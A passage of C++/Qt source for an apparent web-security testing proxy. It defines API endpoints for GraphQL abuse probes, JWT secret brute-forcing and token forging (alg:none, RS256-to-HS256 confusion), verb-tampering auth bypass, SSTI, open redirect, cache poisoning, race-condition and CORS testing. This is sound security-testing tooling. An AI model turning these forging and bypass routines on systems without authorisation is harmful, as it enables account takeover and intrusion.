                R"({"query":"{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}"})",
                "\"data\"", "Cannot query field",
                "medium", "graphql-depth-bypass",
                "GraphQL allows 10-level deep nested query (no depth limit)",
                "set max query depth (graphql-depth-limit etc.)",
            },
            {
                "batch-bypass",
                R"([{"query":"{__typename}"},{"query":"{__typename}"}])",
                "[", "",
                "low", "graphql-batched-queries",
                "GraphQL accepts batched-array queries (rate-limit bypass)",
                "disable batched mode or rate-limit per-operation",
            },
        };
        // Build the alias-amplification body.
        QByteArray aliasQuery = "{\"query\":\"{";
        for (int i = 0; i < 100; ++i) {
            aliasQuery += "a" + QByteArray::number(i) + ":__typename ";
        }
        aliasQuery += "}\"}";
        QList<Probe> work = probes;
        for (auto &p : work) {
            if (p.queryJson.isEmpty()) p.queryJson = aliasQuery;
        }

        Wiring w = m_wiring;
        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool useTls = (u.scheme() == "https");
        const QString reqPath = u.path().isEmpty() ? "/graphql" : u.path();

        (void)QtConcurrent::run([w, host, port, useTls, reqPath, work, extraHeaders]() {
            for (const auto &p : work) {
                // Hand-craft an HTTP/1.1 POST. We use HttpClient::send for
                // wire-level TLS/keepalive; raw assembly is fine here
                // because we control every byte.
                QByteArray bytes;
                bytes  = "POST " + reqPath.toUtf8() + " HTTP/1.1\r\n";
                bytes += "Host: " + host.toUtf8() + "\r\n";
                bytes += "Content-Type: application/json\r\n";
                bytes += "User-Agent: Nullock/graphql-probe\r\n";
                bytes += "Accept: application/json\r\n";
                for (auto it = extraHeaders.begin(); it != extraHeaders.end(); ++it) {
                    bytes += it.key().toUtf8() + ": "
                          + it.value().toString().toUtf8() + "\r\n";
                }
                bytes += "Content-Length: "
                       + QByteArray::number(p.queryJson.size()) + "\r\n";
                bytes += "Connection: close\r\n\r\n";
                bytes += p.queryJson;

                Nullock::Core::HttpClient client;
                const auto r = client.send(host, static_cast<quint16>(port),
                                           useTls, bytes);
                if (!r.ok) continue;
                const QByteArray respBody = r.parsed.body;

                // Negative-marker check first (e.g. "Cannot query field"
                // means depth probe was rejected -> no finding).
                if (!p.missMarker.isEmpty()
                    && respBody.contains(p.missMarker))
                    continue;
                // Positive-marker check: response must contain the
                // expected indicator (e.g. "__schema" reflected back).
                if (!respBody.contains(p.expectMarker))
                    continue;
                // Don't flag transport errors as findings.
                if (r.parsed.statusCode >= 500) continue;

                const QString fullUrl =
                    QString("%1://%2%3").arg(useTls ? "https" : "http", host, reqPath);
                if (w.scanner) {
                    QMetaObject::invokeMethod(w.scanner, [w, p, host, fullUrl]() {
                        w.scanner->reportFinding(
                            0, QString::fromLatin1(p.severity),
                            QString::fromLatin1(p.kind),
                            QString::fromLatin1(p.summary),
                            QString::fromLatin1(p.fixHint),
                            host, fullUrl);
                    }, Qt::QueuedConnection);
                }
            }
        });
        return okJson({{ "queued", static_cast<int>(work.size()) },
                       { "target", url }});
    }

    // ---- JWT attack toolkit ------------------------------------------
    // POST /api/jwt/analyze { token, wordlist?: ["secret", ...] }
    //   Decodes the token, lists weaknesses, and (if a wordlist is given)
    //   tries to recover a weak HS* secret. All offline.
    if (path == "/api/jwt/analyze") {
        const QString token = bodyJson.value("token").toString();
        if (token.isEmpty())
            return okJson({{ "ok", false }, { "error", "token required" }});
        const auto d = Nullock::Core::JwtTool::decode(token);
        if (!d.ok)
            return okJson({{ "ok", false }, { "error", d.error }});

        QJsonArray weaknesses;
        for (const auto &w : Nullock::Core::JwtTool::analyze(d)) {
            weaknesses.append(QJsonObject{
                { "id", w.id }, { "severity", w.severity }, { "detail", w.detail } });
        }

        QString recovered;
        if (bodyJson.contains("wordlist")) {
            QStringList cands;
            for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
                cands.append(v.toString());
            recovered = Nullock::Core::JwtTool::bruteHmac(d, cands);
        }

        QJsonObject out{
            { "ok", true },
            { "alg", d.alg },
            { "typ", d.typ },
            { "kid", d.kid },
            { "header", QJsonDocument::fromJson(d.headerJson.toUtf8()).object() },
            { "payload", QJsonDocument::fromJson(d.payloadJson.toUtf8()).object() },
            { "weaknesses", weaknesses },
        };
        if (bodyJson.contains("wordlist")) {
            out["secretRecovered"] = !recovered.isEmpty();
            out["secret"] = recovered;   // empty if not found
        }
        return httpJson(200, out);
    }

    // POST /api/jwt/forge
    //   { token, attack: "none" | "hs256", secret?, claims?: { k: v } }
    //   none  -> strip the signature (alg:none bypass), apply claim overrides
    //   hs256 -> re-sign with `secret` (also the RS256->HS256 confusion
    //            primitive: pass the server's PEM public key as secret),
    //            applying claim overrides first
    if (path == "/api/jwt/forge") {
        const QString token = bodyJson.value("token").toString();
        const QString attack = bodyJson.value("attack").toString("none").toLower();
        if (token.isEmpty())
            return okJson({{ "ok", false }, { "error", "token required" }});
        const auto d = Nullock::Core::JwtTool::decode(token);
        if (!d.ok)
            return okJson({{ "ok", false }, { "error", d.error }});

        const QJsonObject claims = bodyJson.value("claims").toObject();
        QString forged;
        if (attack == "none") {
            forged = Nullock::Core::JwtTool::forgeNone(d, claims);
        } else if (attack == "hs256" || attack == "hmac") {
            const QByteArray secret = bodyJson.value("secret").toString().toUtf8();
            if (secret.isEmpty())
                return okJson({{ "ok", false },
                               { "error", "hs256 forge needs a secret" }});
            // Apply claim overrides onto a copy of the payload, force HS256.
            QJsonObject header = d.header;  header["alg"] = "HS256";
            QJsonObject payload = d.payload;
            for (auto it = claims.begin(); it != claims.end(); ++it)
                payload[it.key()] = it.value();
            forged = Nullock::Core::JwtTool::signHmac(header, payload, secret);
        } else {
            return okJson({{ "ok", false },
                           { "error", "attack must be 'none' or 'hs256'" }});
        }
        return httpJson(200, QJsonObject{
            { "ok", true }, { "attack", attack }, { "token", forged } });
    }

    // ---- Deep-scan orchestrator --------------------------------------
    // POST /api/audit/run { url, method?, body?, headers?, include?: [...] }
    //   Points the whole active-testing battery at one endpoint in a single
    //   call -- parameter mining, verb-tampering, CORS, IDOR, and (when a
    //   body is given) mass-assignment -- and returns a consolidated report.
    //   Each tester emits its findings into the panel as usual. The "one
    //   command, every test" workflow Burp's per-insertion-point active
    //   scan doesn't give you.
    if (path == "/api/audit/run") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool tls = (u.scheme() == "https");
        QString basePath = u.path(QUrl::FullyEncoded).isEmpty()
                           ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        const QString rawQuery = u.query(QUrl::FullyEncoded);
        if (!rawQuery.isEmpty()) basePath += "?" + rawQuery;
        const QString method = bodyJson.value("method").toString("GET").toUpper();
        const QByteArray body = bodyJson.value("body").toString().toUtf8();
        QList<QPair<QString, QString>> headers;
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            headers.append({ it.key(), it.value().toString() });

        // Which testers to run (default: all applicable).
        QSet<QString> include;
        for (const QJsonValue &v : bodyJson.value("include").toArray())
            include.insert(v.toString().toLower());

        AuditTarget t;
        t.host = host; t.port = port; t.tls = tls;
        t.method = method; t.basePath = basePath; t.body = body;
        t.headers = headers; t.url = url;
        for (const auto &h : headers)
            if (h.first.compare("Content-Type", Qt::CaseInsensitive) == 0)
                { t.contentType = h.second; break; }

        // NOTE: this runs the whole battery synchronously and blocks the
        // control server for its duration, like the other active-test
        // endpoints. For a session-wide sweep use /api/audit/all, which
        // runs off-thread.
        QJsonArray testerReports;
        const int totalFindings = runDeepAudit(m_wiring.scanner, t, include, testerReports);

        return okJson({{ "target", url },
                       { "totalFindings", totalFindings },
                       { "testers", testerReports }});
    }

    // ---- Session-wide deep audit -------------------------------------
    // POST /api/audit/all { urls?: [...], fromHistory?, limit?, throttleMs?,
    //                       include? }
    //   Runs the deep-scan battery against every URL given (and/or every
    //   captured history row that carries a query string or body), OFF the
    //   control thread so the UI stays responsive. Findings land in the
    //   panel as they're confirmed; returns the queued count immediately.
    //   The "browse the app, then audit everything you touched" workflow.
    if (path == "/api/audit/all") {
        // One sweep at a time -- a second concurrent sweep would double the
        // outbound active-test traffic against the target for no benefit.
        static QAtomicInteger<int> auditAllInFlight(0);
        if (!auditAllInFlight.testAndSetAcquire(0, 1))
            return okJson({{ "ok", false }, { "queued", 0 },
                           { "error", "a deep-audit sweep is already running" }});

        QSet<QString> include;
        for (const QJsonValue &v : bodyJson.value("include").toArray())
            include.insert(v.toString().toLower());
        int throttleMs = bodyJson.value("throttleMs").toInt(150);
        int limit = bodyJson.value("limit").toInt(50);
        throttleMs = qBound(0, throttleMs, 60'000);
        limit = qBound(1, limit, 200);

        QList<AuditTarget> targets;
        auto fromUrl = [&](const QString &urlStr) {
            const QUrl uu(urlStr);
            if (!uu.isValid() || uu.host().isEmpty()) return;
            AuditTarget t;
            t.host = uu.host();
            t.port = uu.port(uu.scheme() == "https" ? 443 : 80);
            t.tls  = (uu.scheme() == "https");
            t.method = "GET";
            t.basePath = uu.path(QUrl::FullyEncoded).isEmpty()
                         ? QStringLiteral("/") : uu.path(QUrl::FullyEncoded);
            if (!uu.query(QUrl::FullyEncoded).isEmpty())
                t.basePath += "?" + uu.query(QUrl::FullyEncoded);
            t.url = urlStr;
            targets.append(t);
        };
        for (const QJsonValue &v : bodyJson.value("urls").toArray())
            if (targets.size() < limit) fromUrl(v.toString());

        // Pull in history rows that have a query string or a body.
        if (bodyJson.value("fromHistory").toBool(false) && m_wiring.history) {
            const int rc = m_wiring.history->rowCount();
            for (int i = rc - 1; i >= 0 && targets.size() < limit; --i) {
                const auto *r = m_wiring.history->requestAt(i);
                if (!r || r->method.startsWith("WS")) continue;
                const bool hasQuery = r->path.contains('?');
                const bool hasBody  = !r->body.isEmpty();
                if (!hasQuery && !hasBody) continue;
                AuditTarget t;
                t.host = r->host; t.port = r->port;
                // Use the captured response's real TLS flag, not a port guess.
                const auto *resp = m_wiring.history->responseAt(i);
                t.tls = resp ? resp->wasTls : (r->port == 443);
                t.method = r->method.isEmpty() ? QStringLiteral("GET") : r->method;
                t.basePath = r->path; t.body = r->body;
                for (const auto &h : r->headers)
                    if (h.first.compare("Content-Type", Qt::CaseInsensitive) == 0)
                        { t.contentType = h.second; break; }
                t.url = (t.tls ? "https://" : "http://") + r->host + r->path;
                targets.append(t);
            }
        }
        if (targets.isEmpty()) {
            auditAllInFlight.storeRelease(0);
            return okJson({{ "ok", false }, { "queued", 0 },
                           { "error", "no urls or history rows with params/body" }});
        }

        // QPointer guards against the scanner being torn down mid-sweep: we
        // check it before each target and bail if it's gone.
        QPointer<Nullock::Core::PassiveScanner> scGuard(m_wiring.scanner);
        (void)QtConcurrent::run([scGuard, targets, include, throttleMs]() {
            for (const AuditTarget &t : targets) {
                if (scGuard.isNull()) break;          // app/scanner torn down
                QJsonArray ignore;
                runDeepAudit(scGuard.data(), t, include, ignore);
                if (throttleMs > 0) QThread::msleep(static_cast<unsigned long>(throttleMs));
            }
            auditAllInFlight.storeRelease(0);          // sweep done; allow the next
        });
        return okJson({{ "queued", static_cast<int>(targets.size()) }});
    }

    // ---- Parameter mining --------------------------------------------
    // POST /api/paramminer { url, method?, wordlist?: [...], headers?: {} }
    //   Discovers hidden parameters by response-diffing: fires batches of
    //   candidate names and reports the ones the server reflects or that
    //   flip the HTTP status. Burp ships this only as the param-miner
    //   extension; we do it in the core. Discovered params also become
    //   findings so they ride into the report / SARIF export.
    if (path == "/api/paramminer") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::ParamMiner::Request mreq;
        mreq.host   = u.host();
        mreq.port   = u.port(u.scheme() == "https" ? 443 : 80);
        mreq.tls    = (u.scheme() == "https");
        mreq.method = bodyJson.value("method").toString("GET").toUpper();
        mreq.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                        ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            mreq.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            mreq.headers.append({ it.key(), it.value().toString() });

        QStringList wordlist;
        for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
            wordlist << v.toString();
        if (wordlist.isEmpty())
            wordlist = Nullock::Core::ParamMiner::defaultWordlist();
        if (wordlist.size() > 2000) wordlist = wordlist.mid(0, 2000);
        const int batch = bodyJson.value("batchSize").toInt(25);

        Nullock::Core::ParamMiner::Result mr;
        {
            auto fut = QtConcurrent::run([mreq, wordlist, batch]() {
                return Nullock::Core::ParamMiner::mine(mreq, wordlist, batch);
            });
            fut.waitForFinished();
            mr = fut.result();
        }

        // Emit findings for discovered params so they show up in the
        // findings panel / report alongside everything else.
        if (m_wiring.scanner) {
            const QString host = u.host();
            for (const auto &f : mr.found) {
                const QString sev  = f.reflected ? QStringLiteral("medium")
                                                 : QStringLiteral("low");
                const QString kind = f.reflected ? QStringLiteral("hidden-param-reflected")
                                                 : QStringLiteral("hidden-param");
                const QString summary = f.reflected
                    ? QString("Hidden parameter '%1' is reflected in the response").arg(f.name)
                    : QString("Hidden parameter '%1' changes the response (status %2 -> %3)")
                          .arg(f.name).arg(f.baselineStatus).arg(f.observedStatus);
                m_wiring.scanner->reportFinding(0, sev, kind, summary,
                    "discovered by param-miner via " + f.signal, host, url);
            }
        }

        QJsonArray found;
        for (const auto &f : mr.found)
            found.append(QJsonObject{
                { "name", f.name }, { "signal", f.signal },
                { "reflected", f.reflected },
                { "baselineStatus", f.baselineStatus },
                { "observedStatus", f.observedStatus } });
        return okJson({{ "ok", mr.error.isEmpty() },
                       { "error", mr.error },
                       { "requestsSent", mr.requestsSent },
                       { "candidatesTried", mr.candidatesTried },
                       { "statusSignalUsable", mr.statusSignalUsable },
                       { "reflectionSignalUsable", mr.reflectionSignalUsable },
                       { "foundCount", static_cast<int>(mr.found.size()) },
                       { "found", found }});
    }

    // ---- Verb-tampering / method auth-bypass -------------------------
    // POST /api/verbtamper/test { url, method?, body?, headers? }
    //   Takes a denied request and retries it with alternate methods,
    //   method-override headers, and case variation; flags any that flip
    //   to 2xx (a confirmed access-control bypass). CWE-650.
    if (path == "/api/verbtamper/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::VerbTamper::Request vr;
        vr.host = u.host();
        vr.port = u.port(u.scheme() == "https" ? 443 : 80);
        vr.tls  = (u.scheme() == "https");
        vr.method = bodyJson.value("method").toString("GET").toUpper();
        vr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            vr.basePath += "?" + u.query(QUrl::FullyEncoded);
        vr.body = bodyJson.value("body").toString().toUtf8();
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            vr.headers.append({ it.key(), it.value().toString() });

        const auto vres = Nullock::Core::VerbTamper::test(vr);

        QJsonArray bypasses;
        QStringList techniques;
        for (const auto &b : vres.bypasses) {
            bypasses.append(QJsonObject{
                { "technique", b.technique }, { "detail", b.detail },
                { "status", b.status } });
            techniques << b.technique;
        }
        if (m_wiring.scanner && !vres.bypasses.isEmpty()) {
            m_wiring.scanner->reportFinding(0, "high", "auth-bypass-verb-tampering",
                QString("Verb tampering: %1 (denied %2) is reachable via %3")
                    .arg(vr.basePath).arg(vres.baselineStatus).arg(techniques.join(", ")),
                "denied baseline flipped to 2xx under the listed techniques",
                u.host(), url);
        }
        return okJson({{ "ok", vres.error.isEmpty() },
                       { "error", vres.error },
                       { "baselineStatus", vres.baselineStatus },
                       { "baselineDenied", vres.baselineDenied },
                       { "requestsSent", vres.requestsSent },
                       { "bypassCount", static_cast<int>(vres.bypasses.size()) },
                       { "bypasses", bypasses }});
    }

    // ---- Server-Side Template Injection ------------------------------
    // POST /api/ssti/test { url, param, in?, method?, body?, contentType?,
    //                       headers? }
    //   Injects an arithmetic-bearing polyglot per template-engine delimiter
    //   family into `param` and confirms SSTI when the server returns the
    //   evaluated product (not the literal expression). The family that fires
    //   fingerprints the engine. CWE-1336 -- frequently RCE.
    if (path == "/api/ssti/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        const QString param = bodyJson.value("param").toString();
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        if (param.isEmpty())
            return okJson({{ "ok", false }, { "error", "param required" }});

        Nullock::Core::Ssti::Request sr;
        sr.host = u.host();
        sr.port = u.port(u.scheme() == "https" ? 443 : 80);
        sr.tls  = (u.scheme() == "https");
        sr.method = bodyJson.value("method").toString("GET").toUpper();
        sr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        sr.query = u.query(QUrl::FullyEncoded);
        sr.body = bodyJson.value("body").toString().toUtf8();
        sr.contentType = bodyJson.value("contentType").toString();
        sr.paramName = param;
        sr.paramIn = bodyJson.value("in").toString("query");
        const QJsonObject shdrs = bodyJson.value("headers").toObject();
        for (auto it = shdrs.begin(); it != shdrs.end(); ++it)
            sr.headers.append({ it.key(), it.value().toString() });

        const auto sres = Nullock::Core::Ssti::test(sr);

        QJsonArray hits;
        QStringList fams;
        for (const auto &h : sres.hits) {
            hits.append(QJsonObject{
                { "polyglot", h.polyglot }, { "engines", h.engines },
                { "evidence", h.evidence } });
            fams << h.polyglot;
        }
        if (m_wiring.scanner && sres.confirmed) {
            m_wiring.scanner->reportFinding(0, "critical", "ssti-confirmed",
                QString("Server-side template injection in '%1' -- %2 (%3)")
                    .arg(param, sres.engines, fams.join(", ")),
                "the server evaluated an injected arithmetic expression; "
                "template injection is frequently a path to RCE",
                u.host(), url);
        } else if (m_wiring.scanner && sres.engineLikely) {
            m_wiring.scanner->reportFinding(0, "medium", "ssti-engine-likely",
                QString("Template engine likely behind '%1' -- a syntax break "
                        "5xx'd an otherwise-OK endpoint").arg(param),
                "no value reflected, but malformed template syntax errored the "
                "response; worth manual confirmation",
                u.host(), url);
        }
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "injected", sres.injected },
                       { "confirmed", sres.confirmed },
                       { "engineLikely", sres.engineLikely },
                       { "engines", sres.engines },
                       { "baselineStatus", sres.baselineStatus },
                       { "requestsSent", sres.requestsSent },
                       { "hitCount", static_cast<int>(sres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Open redirect -----------------------------------------------
    // POST /api/openredirect/test { url, param?, method?, headers? }
    //   Fires parser-confusion bypass payloads at the redirect param and
    //   confirms only when the Location header *resolves* to our sentinel
    //   host -- not on naive reflection. CWE-601.
    if (path == "/api/openredirect/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::OpenRedirect::Request orq;
        orq.host = u.host();
        orq.port = u.port(u.scheme() == "https" ? 443 : 80);
        orq.tls  = (u.scheme() == "https");
        orq.method = bodyJson.value("method").toString("GET").toUpper();
        orq.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                       ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        orq.query = u.query(QUrl::FullyEncoded);
        orq.param = bodyJson.value("param").toString();
        const QJsonObject ohdrs = bodyJson.value("headers").toObject();
        for (auto it = ohdrs.begin(); it != ohdrs.end(); ++it)
            orq.headers.append({ it.key(), it.value().toString() });

        const auto ores = Nullock::Core::OpenRedirect::test(orq);

        QJsonArray hits;
        QStringList techniques;
        for (const auto &h : ores.hits) {
            hits.append(QJsonObject{
                { "technique", h.technique }, { "payload", h.payload },
                { "via", h.via }, { "resolvedHost", h.resolvedHost },
                { "status", h.status } });
            techniques << h.technique;
        }
        if (m_wiring.scanner && ores.vulnerable) {
            // Header-confirmed (Location) is high; client-side-only is medium.
            bool headerConfirmed = false;
            for (const auto &h : ores.hits) if (h.via == "Location") headerConfirmed = true;
            m_wiring.scanner->reportFinding(0, headerConfirmed ? "high" : "medium",
                "open-redirect",
                QString("Open redirect in '%1' -- %2 redirect(s) leave the origin (%3)")
                    .arg(ores.testedParam).arg(ores.hits.size()).arg(techniques.join(", ")),
                "a crafted value redirects victims off-origin; an OAuth/SSO redirect_uri "
                "in this position is a token-leak primitive",
                u.host(), url);
        }
        return okJson({{ "ok", ores.error.isEmpty() },
                       { "error", ores.error },
                       { "testedParam", ores.testedParam },
                       { "vulnerable", ores.vulnerable },
                       { "baselineStatus", ores.baselineStatus },
                       { "requestsSent", ores.requestsSent },
                       { "hitCount", static_cast<int>(ores.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Web cache poisoning -----------------------------------------
    // POST /api/cache/poison { url, method?, headers? }
    //   Injects unkeyed headers (X-Forwarded-Host, X-Original-URL, ...) with
    //   a random sentinel and a per-probe cache-buster, then re-requests the
    //   same key with no header; a sentinel served from cache proves the
    //   poisoning end to end. CWE-349. Verifies the buster is cache-keyed
    //   before injecting and aborts otherwise, so it can't poison real users.
    if (path == "/api/cache/poison") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CachePoison::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.method = bodyJson.value("method").toString("GET").toUpper();
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        cr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject chdrs = bodyJson.value("headers").toObject();
        for (auto it = chdrs.begin(); it != chdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        const auto cres = Nullock::Core::CachePoison::test(cr);

        QJsonArray hits;
        for (const auto &h : cres.hits) {
            hits.append(QJsonObject{
                { "header", h.header }, { "sentValue", h.sentValue },
                { "where", h.where }, { "reflected", h.reflected },
                { "cacheable", h.cacheable }, { "cacheConfirmed", h.cacheConfirmed } });
            if (m_wiring.scanner) {
                if (h.cacheConfirmed)
                    m_wiring.scanner->reportFinding(0, "critical", "web-cache-poisoning-confirmed",
                        QString("Web cache poisoning via %1 on %2 -- a clean request was served the injected value from cache")
                            .arg(h.header, cr.basePath),
                        "an unkeyed header reflected into a cacheable response and survived a header-less re-request",
                        u.host(), url);
                else if (h.cacheable)
                    m_wiring.scanner->reportFinding(0, "high", "web-cache-poisoning",
                        QString("Unkeyed header %1 reflects into a cacheable response (%2)")
                            .arg(h.header, h.where),
                        "reflected into a response carrying cache signals; likely poisonable",
                        u.host(), url);
                else
                    m_wiring.scanner->reportFinding(0, "low", "web-cache-unkeyed-reflected",
                        QString("Unkeyed header %1 reflects into the response (%2)")
                            .arg(h.header, h.where),
                        "no cache evidence observed; confirm whether a fronting cache stores it",
                        u.host(), url);
            }
        }
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "baselineStatus", cres.baselineStatus },
                       { "requestsSent", cres.requestsSent },
                       { "anyConfirmed", cres.anyConfirmed },
                       { "anyCacheable", cres.anyCacheable },
                       { "hitCount", static_cast<int>(cres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Race-condition tester ---------------------------------------
    // POST /api/race/test { url, method?, body?, contentType?, headers?,
    //                       count?, successStatusMin?, successStatusMax?,
    //                       successMatch? }
    //   Fires `count` concurrent copies and flags a limited-use operation
    //   that leaked extra successes (1 < successes < count). The single-
    //   packet / Turbo-Intruder class, in the core.
    if (path == "/api/race/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::RaceTester::Request rr;
        rr.host = u.host();
        rr.port = u.port(u.scheme() == "https" ? 443 : 80);
        rr.tls  = (u.scheme() == "https");
        rr.method = bodyJson.value("method").toString("POST").toUpper();
        rr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            rr.basePath += "?" + u.query(QUrl::FullyEncoded);
        rr.body = bodyJson.value("body").toString().toUtf8();
        rr.contentType = bodyJson.value("contentType").toString("application/json");
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            rr.headers.append({ it.key(), it.value().toString() });

        const int count = bodyJson.value("count").toInt(20);
        const int smin  = bodyJson.value("successStatusMin").toInt(200);
        const int smax  = bodyJson.value("successStatusMax").toInt(299);
        const QString smatch = bodyJson.value("successMatch").toString();

        // test() runs its own dedicated thread pool and blocks until the
        // burst completes, so call it directly -- no outer QtConcurrent wrap.
        const auto rres = Nullock::Core::RaceTester::test(rr, count, smin, smax, smatch);

        QJsonObject hist;
        for (auto it = rres.statusHistogram.cbegin(); it != rres.statusHistogram.cend(); ++it)
            hist.insert(QString::number(it.key()), it.value());
        if (m_wiring.scanner && rres.raceSuspected) {
            m_wiring.scanner->reportFinding(0, "high", "race-condition-suspect",
                QString("Race condition: %1 of %2 concurrent requests succeeded "
                        "(a single-use operation leaked extra successes)")
                    .arg(rres.successCount).arg(rres.count),
                "status histogram: " + QString::fromUtf8(QJsonDocument(hist).toJson(QJsonDocument::Compact)),
                u.host(), url);
        }
        return okJson({{ "ok", rres.error.isEmpty() },
                       { "error", rres.error },
                       { "count", rres.count },
                       { "successCount", rres.successCount },
                       { "rejectionCount", rres.rejectionCount },
                       { "rateLimited", rres.rateLimited },
                       { "serverError", rres.serverError },
                       { "transportFail", rres.transportFail },
                       { "raceSuspected", rres.raceSuspected },
                       { "inconclusive", rres.inconclusive },
                       { "allSucceeded", rres.allSucceeded },
                       { "statusHistogram", hist }});
    }

    // ---- JS recon: endpoints + source-map exposure -------------------
    // POST /api/jsrecon/scan { url, headers?: {}, maxScripts? }
    //   Mines the page's same-origin JS bundles for API endpoints and
    //   flags any exposed source maps (which leak original source).
    if (path == "/api/jsrecon/scan") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::JsRecon::Request jr;
        jr.host = u.host();
        jr.port = u.port(u.scheme() == "https" ? 443 : 80);
        jr.tls  = (u.scheme() == "https");
        jr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            jr.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            jr.headers.append({ it.key(), it.value().toString() });
        const int maxScripts = bodyJson.value("maxScripts").toInt(20);

        Nullock::Core::JsRecon::Result jres;
        {
            auto fut = QtConcurrent::run([jr, maxScripts]() {
                return Nullock::Core::JsRecon::scan(jr, maxScripts);
            });
            fut.waitForFinished();
            jres = fut.result();
        }

        QJsonArray endpoints;
        for (const QString &e : jres.endpoints) endpoints.append(e);
        QJsonArray scripts;
        for (const QString &s : jres.scripts) scripts.append(s);
        QJsonArray crossOrigin;
        for (const QString &s : jres.crossOriginScripts) crossOrigin.append(s);
        QJsonArray maps;
        for (const auto &m : jres.sourceMaps) {
            QJsonArray srcs;
            for (const QString &s : m.sources) srcs.append(s);
            maps.append(QJsonObject{
                { "jsUrl", m.jsUrl }, { "mapUrl", m.mapUrl },
                { "accessible", m.accessible }, { "sources", srcs } });
            if (m_wiring.scanner && m.accessible) {
                m_wiring.scanner->reportFinding(0, "medium", "source-map-exposed",
                    QString("Source map exposed: %1 leaks %2 original source file(s)")
                        .arg(m.mapUrl).arg(m.sources.size()),
                    "first sources: " + m.sources.mid(0, 5).join(", "),
                    u.host(), url);
            }
        }
        return okJson({{ "ok", jres.error.isEmpty() },
                       { "error", jres.error },
                       { "requestsSent", jres.requestsSent },
                       { "scripts", scripts },
                       { "crossOriginScripts", crossOrigin },
                       { "endpointCount", static_cast<int>(jres.endpoints.size()) },
                       { "endpoints", endpoints },
                       { "sourceMaps", maps }});
    }

    // ---- Active CORS exploitability ----------------------------------
    // POST /api/cors/test { url, method?, headers?: {} }
    //   Fires an Origin battery and classifies ACAO/ACAC. Proves whether a
    //   cross-origin attacker can read the response (vs the passive scanner
    //   which only notices a reflection that already happened).
    if (path == "/api/cors/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CorsTester::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.method = bodyJson.value("method").toString("GET").toUpper();
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
